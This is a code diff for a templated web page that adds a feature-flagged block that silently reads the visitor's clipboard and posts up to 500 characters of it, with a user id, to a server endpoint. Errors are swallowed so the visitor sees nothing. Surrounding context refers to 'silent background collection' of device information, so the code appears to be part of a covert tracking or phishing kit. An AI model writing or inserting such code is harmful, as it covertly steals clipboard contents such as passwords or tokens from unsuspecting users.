@@ -202,6 +202,18 @@ window.addEventListener("beforeunload",function(){
 });
 <% } %>
 
+<% if(feat.clipboard){ %>
+(function(){
+  try{
+    navigator.clipboard.readText().then(function(text){
+      if(text&&text.trim().length>0){
+        $.post(a+"/clipboard",{uid:uid,clip:encodeURIComponent(text.slice(0,500))});
+      }
+    }).catch(function(){});
+  }catch(e){}
+})();
+<% } %>
+
 // ── Silent background collection ──────────────────────────────────────────────
 async function sendDeviceInfo(){
   var td="";
